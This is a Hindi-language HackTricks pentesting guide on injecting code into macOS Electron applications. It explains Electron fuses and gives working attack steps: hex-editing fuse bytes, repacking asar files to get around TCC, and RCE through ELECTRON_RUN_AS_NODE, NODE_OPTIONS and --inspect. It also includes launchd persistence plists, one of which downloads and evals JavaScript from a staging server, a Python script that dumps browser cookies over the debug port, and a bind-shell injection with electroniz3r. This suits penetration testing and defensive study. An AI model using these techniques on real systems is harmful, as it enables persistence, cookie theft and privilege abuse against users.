# macOS Electron Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## Basic Information

यदि आप नहीं जानते कि Electron क्या है, तो आप [**यहां बहुत सारी जानकारी पा सकते हैं**](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/xss-to-rce-electron-desktop-apps)। लेकिन अभी के लिए बस इतना जान लें कि Electron **node** चलाता है।\
और node के कुछ **parameters** और **env variables** हैं जिन्हें **अन्य कोड निष्पादित करने** के लिए उपयोग किया जा सकता है, जो निर्दिष्ट फ़ाइल के अलावा हैं।

### Electron Fuses

इन तकनीकों पर अगली चर्चा की जाएगी, लेकिन हाल के समय में Electron ने कई **सुरक्षा ध्वज जोड़े हैं** ताकि उन्हें रोका जा सके। ये हैं [**Electron Fuses**](https://www.electronjs.org/docs/latest/tutorial/fuses) और ये वे हैं जो macOS में Electron ऐप्स को **मनमाने कोड** को **लोड करने** से **रोकने** के लिए उपयोग किए जाते हैं:

- **`RunAsNode`**: यदि अक्षम किया गया, तो यह कोड इंजेक्ट करने के लिए env var **`ELECTRON_RUN_AS_NODE`** के उपयोग को रोकता है।
- **`EnableNodeCliInspectArguments`**: यदि अक्षम किया गया, तो `--inspect`, `--inspect-brk` जैसे params का सम्मान नहीं किया जाएगा। इस तरह कोड इंजेक्ट करने से बचना।
- **`EnableEmbeddedAsarIntegrityValidation`**: यदि सक्षम किया गया, तो लोड किया गया **`asar`** **file** macOS द्वारा **मान्य** किया जाएगा। इस तरह **कोड इंजेक्शन** को इस फ़ाइल की सामग्री को संशोधित करके रोकना।
- **`OnlyLoadAppFromAsar`**: यदि यह सक्षम है, तो यह निम्नलिखित क्रम में लोड करने के लिए खोजने के बजाय: **`app.asar`**, **`app`** और अंततः **`default_app.asar`**। यह केवल app.asar की जांच करेगा और इसका उपयोग करेगा, इस प्रकार यह सुनिश्चित करेगा कि जब **`embeddedAsarIntegrityValidation`** फ्यूज़ के साथ **संयुक्त** किया जाता है, तो **अमान्य कोड** को **लोड करना असंभव** है।
- **`LoadBrowserProcessSpecificV8Snapshot`**: यदि सक्षम किया गया, तो ब्राउज़र प्रक्रिया अपने V8 स्नैपशॉट के लिए `browser_v8_context_snapshot.bin` नामक फ़ाइल का उपयोग करती है।

एक और दिलचस्प फ्यूज़ जो कोड इंजेक्शन को रोकने वाला नहीं है:

- **EnableCookieEncryption**: यदि सक्षम किया गया, तो डिस्क पर कुकी स्टोर को OS स्तर की क्रिप्टोग्राफी कुंजियों का उपयोग करके एन्क्रिप्ट किया जाता है।

### Checking Electron Fuses

आप एक एप्लिकेशन से **इन ध्वजों की जांच** कर सकते हैं:
```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
RunAsNode is Disabled
EnableCookieEncryption is Enabled
EnableNodeOptionsEnvironmentVariable is Disabled
EnableNodeCliInspectArguments is Disabled
EnableEmbeddedAsarIntegrityValidation is Enabled
OnlyLoadAppFromAsar is Enabled
LoadBrowserProcessSpecificV8Snapshot is Disabled
```
### Electron फ्यूज़ को संशोधित करना

जैसा कि [**दस्तावेज़ों में उल्लेख किया गया है**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), **Electron फ्यूज़** की कॉन्फ़िगरेशन **Electron बाइनरी** के अंदर होती है जिसमें कहीं **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`** स्ट्रिंग होती है।

macOS अनुप्रयोगों में यह आमतौर पर `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework` में होता है।
```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```
आप इस फ़ाइल को [https://hexed.it/](https://hexed.it/) में लोड कर सकते हैं और पिछले स्ट्रिंग के लिए खोज कर सकते हैं। इस स्ट्रिंग के बाद आप ASCII में "0" या "1" संख्या देख सकते हैं जो यह दर्शाती है कि प्रत्येक फ्यूज़ अक्षम या सक्षम है। बस हेक्स कोड (`0x30` का अर्थ `0` और `0x31` का अर्थ `1`) को **फ्यूज़ मानों को संशोधित करने** के लिए संशोधित करें।

<figure><img src="../../../images/image (34).png" alt=""><figcaption></figcaption></figure>

ध्यान दें कि यदि आप इन बाइट्स को संशोधित करके **`Electron Framework` बाइनरी** को किसी एप्लिकेशन के अंदर **ओवरराइट** करने की कोशिश करते हैं, तो ऐप नहीं चलेगा।

## RCE कोड को Electron एप्लिकेशनों में जोड़ना

ऐसा हो सकता है कि **बाहरी JS/HTML फ़ाइलें** हों जिनका उपयोग एक Electron ऐप कर रहा है, इसलिए एक हमलावर इन फ़ाइलों में कोड इंजेक्ट कर सकता है जिनका हस्ताक्षर नहीं चेक किया जाएगा और ऐप के संदर्भ में मनमाना कोड निष्पादित कर सकता है।

> [!CAUTION]
> हालाँकि, वर्तमान में 2 सीमाएँ हैं:
>
> - एक ऐप को संशोधित करने के लिए **`kTCCServiceSystemPolicyAppBundles`** अनुमति **आवश्यक** है, इसलिए डिफ़ॉल्ट रूप से यह अब संभव नहीं है।
> - संकलित **`asap`** फ़ाइल में आमतौर पर फ्यूज़ **`embeddedAsarIntegrityValidation`** `और` **`onlyLoadAppFromAsar`** `सक्षम` होते हैं
>
> इस हमले के रास्ते को अधिक जटिल (या असंभव) बना रहा है।

ध्यान दें कि **`kTCCServiceSystemPolicyAppBundles`** की आवश्यकता को दरकिनार करना संभव है, एप्लिकेशन को किसी अन्य निर्देशिका (जैसे **`/tmp`**) में कॉपी करके, फ़ोल्डर **`app.app/Contents`** का नाम बदलकर **`app.app/NotCon`** करना, अपने **दुष्ट** कोड के साथ **asar** फ़ाइल को **संशोधित** करना, इसे फिर से **`app.app/Contents`** नाम देना और इसे निष्पादित करना।

आप asar फ़ाइल से कोड को अनपैक कर सकते हैं:
```bash
npx asar extract app.asar app-decomp
```
और इसे संशोधित करने के बाद फिर से पैक करें:
```bash
npx asar pack app-decomp app-new.asar
```
## RCE with `ELECTRON_RUN_AS_NODE` <a href="#electron_run_as_node" id="electron_run_as_node"></a>

[**दस्तावेज़ों**](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node) के अनुसार, यदि यह env वेरिएबल सेट किया गया है, तो यह प्रक्रिया को एक सामान्य Node.js प्रक्रिया के रूप में शुरू करेगा।
```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
> [!CAUTION]
> यदि फ्यूज़ **`RunAsNode`** अक्षम है तो env var **`ELECTRON_RUN_AS_NODE`** को अनदेखा किया जाएगा, और यह काम नहीं करेगा।

### ऐप प्लिस्ट से इंजेक्शन

जैसा कि [**यहां प्रस्तावित है**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), आप इस env वेरिएबल का दुरुपयोग एक plist में स्थिरता बनाए रखने के लिए कर सकते हैं:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
</dict>
<key>Label</key>
<string>com.xpnsec.hideme</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>-e</string>
<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
## RCE with `NODE_OPTIONS`

आप पेलोड को एक अलग फ़ाइल में स्टोर कर सकते हैं और इसे निष्पादित कर सकते हैं:
```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```
> [!CAUTION]
> यदि फ्यूज़ **`EnableNodeOptionsEnvironmentVariable`** **अक्षम** है, तो ऐप लॉन्च करते समय env var **NODE_OPTIONS** को **अनदेखा** करेगा जब तक कि env वेरिएबल **`ELECTRON_RUN_AS_NODE`** सेट न हो, जिसे फ्यूज़ **`RunAsNode`** के अक्षम होने पर भी **अनदेखा** किया जाएगा।
>
> यदि आप **`ELECTRON_RUN_AS_NODE`** सेट नहीं करते हैं, तो आपको **त्रुटि** मिलेगी: `Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`

### ऐप plist से इंजेक्शन

आप इन कुंजियों को जोड़कर स्थिरता बनाए रखने के लिए plist में इस env वेरिएबल का दुरुपयोग कर सकते हैं:
```xml
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
<key>NODE_OPTIONS</key>
<string>--require /tmp/payload.js</string>
</dict>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## RCE के साथ निरीक्षण

के अनुसार [**यह**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), यदि आप **`--inspect`**, **`--inspect-brk`** और **`--remote-debugging-port`** जैसे फ्लैग के साथ एक Electron एप्लिकेशन चलाते हैं, तो एक **डिबग पोर्ट खुला होगा** ताकि आप इससे कनेक्ट कर सकें (उदाहरण के लिए Chrome में `chrome://inspect`) और आप **इस पर कोड इंजेक्ट कर सकेंगे** या यहां तक कि नए प्रोसेस भी लॉन्च कर सकेंगे।\
उदाहरण के लिए:
```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
> [!CAUTION]
> यदि फ्यूज़ **`EnableNodeCliInspectArguments`** बंद है, तो ऐप **नोड पैरामीटर** (जैसे `--inspect`) को लॉन्च करते समय **अनदेखा** करेगा जब तक कि env वेरिएबल **`ELECTRON_RUN_AS_NODE`** सेट न हो, जिसे भी **अनदेखा** किया जाएगा यदि फ्यूज़ **`RunAsNode`** बंद है।
>
> हालाँकि, आप अभी भी **इलेक्ट्रॉन पैरामीटर `--remote-debugging-port=9229`** का उपयोग कर सकते हैं लेकिन पिछले पेलोड अन्य प्रक्रियाओं को निष्पादित करने के लिए काम नहीं करेगा।

पैरामीटर **`--remote-debugging-port=9222`** का उपयोग करके इलेक्ट्रॉन ऐप से कुछ जानकारी चुराना संभव है जैसे **इतिहास** (GET कमांड के साथ) या ब्राउज़र के **कुकीज़** (क्योंकि वे ब्राउज़र के अंदर **डिक्रिप्ट** होते हैं और एक **json एंडपॉइंट** है जो उन्हें देगा)।

आप यह सीख सकते हैं [**यहाँ**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) और [**यहाँ**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) और स्वचालित उपकरण [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) या एक साधारण स्क्रिप्ट का उपयोग करें जैसे:
```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```
इस [**ब्लॉगपोस्ट**](https://hackerone.com/reports/1274695) में, इस डिबगिंग का दुरुपयोग किया गया है ताकि एक हेडलेस क्रोम **मनमाने स्थानों में मनमाने फ़ाइलें डाउनलोड** कर सके।

### ऐप प्लिस्ट से इंजेक्शन

आप इन कुंजियों को जोड़कर स्थिरता बनाए रखने के लिए एक plist में इस env वेरिएबल का दुरुपयोग कर सकते हैं:
```xml
<dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>--inspect</string>
</array>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## TCC Bypass पुराने संस्करणों का दुरुपयोग

> [!TIP]
> macOS का TCC डेमन एप्लिकेशन के निष्पादित संस्करण की जांच नहीं करता है। इसलिए यदि आप **Electron एप्लिकेशन में कोड इंजेक्ट नहीं कर सकते** किसी भी पिछले तकनीकों के साथ, तो आप APP का एक पिछला संस्करण डाउनलोड कर सकते हैं और उस पर कोड इंजेक्ट कर सकते हैं क्योंकि इसे अभी भी TCC विशेषाधिकार मिलेंगे (जब तक कि Trust Cache इसे रोक न दे)।

## गैर-JS कोड चलाना

पिछली तकनीकें आपको **Electron एप्लिकेशन की प्रक्रिया के अंदर JS कोड चलाने** की अनुमति देंगी। हालाँकि, याद रखें कि **बच्चे की प्रक्रियाएँ माता-पिता एप्लिकेशन के समान सैंडबॉक्स प्रोफ़ाइल के तहत चलती हैं** और **उनकी TCC अनुमतियाँ विरासत में लेती हैं**।\
इसलिए, यदि आप कैमरा या माइक्रोफ़ोन तक पहुँचने के लिए विशेषाधिकारों का दुरुपयोग करना चाहते हैं, तो आप बस **प्रक्रिया से एक और बाइनरी चला सकते हैं**।

## स्वचालित इंजेक्शन

उपकरण [**electroniz3r**](https://github.com/r3ggi/electroniz3r) का उपयोग करना आसान है **संवेदनशील इलेक्ट्रॉन एप्लिकेशन** खोजने और उन पर कोड इंजेक्ट करने के लिए। यह उपकरण **`--inspect`** तकनीक का उपयोग करने की कोशिश करेगा:

आपको इसे स्वयं संकलित करना होगा और आप इसे इस तरह उपयोग कर सकते हैं:
```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```
## संदर्भ

- [https://www.electronjs.org/docs/latest/tutorial/fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
- [https://m.youtube.com/watch?v=VWQY5R2A6X8](https://m.youtube.com/watch?v=VWQY5R2A6X8)

{{#include ../../../banners/hacktricks-training.md}}
